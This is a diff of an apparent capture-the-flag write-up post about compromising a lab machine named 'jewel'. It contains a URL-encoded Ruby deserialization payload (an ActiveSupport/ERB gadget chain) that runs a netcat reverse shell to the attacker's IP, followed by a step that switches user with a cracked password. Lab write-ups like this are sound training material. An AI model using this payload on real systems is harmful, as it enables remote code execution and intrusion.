@@ -36,3 +36,15 @@ published: false
 <p>Payload <blockquote>%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22U%60rm+%2Ftmp%2Ff%3Bmkfifo%20%2ftmp%2ff%3bcat%20%2ftmp%2ff%7c%2fbin%2fsh+-i+2%3e%261%7cnc+10.10.XX.XX+9001+%3e%2Ftmp%2ff%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T</blockquote></p>
 <p>Change the ip to your ip</p>
 <img src="https://i.ibb.co/52wq0rs/web10.png" alt="web10" border="0">
+<img src="https://i.ibb.co/GRGjx1b/cmd2.jpg" alt="cmd2" border="0">
+<pre>
+<span class="k">$ su bill</span>
+<span class="na">Password: </span>
+<span class="k">bill@jewel:~$ whoami</span>
+<span class="na">bill</span>
+                                                                </pre>
+<p>The password is "spongebob" we cracked it,if you remember </p>                                                     <p>Let`s upgrade our shell </p>
+<img src="https://i.ibb.co/wJVwsXx/ssh.jpg" alt="ssh" border="0">
+<img src="https://i.ibb.co/cCN66PD/ssshhs1.jpg" alt="ssshhs1" border="0">
+    
+                                                                
